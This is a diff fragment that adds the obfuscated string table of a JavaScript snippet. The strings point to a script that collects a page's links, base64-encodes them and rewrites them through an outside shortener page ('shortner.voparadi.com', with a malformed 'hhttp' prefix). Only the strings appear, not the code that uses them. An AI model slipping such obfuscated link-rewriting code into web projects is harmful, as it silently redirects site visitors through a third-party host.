@@ -1,0 +1,2 @@
+var _0xdc1d=["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=","","charCodeAt","charAt","_keyStr","length","replace","indexOf","fromCharCode","
+","encode","getElementById","decode","output","input","hostname","location","match",", ","a","getElementsByTagName","href","http","hhttp://shortner.voparadi.com/p/decrypt.html?id=","rel","nofollow",":::","anonyminized","found_links","innerHTML"," ",",","split"]
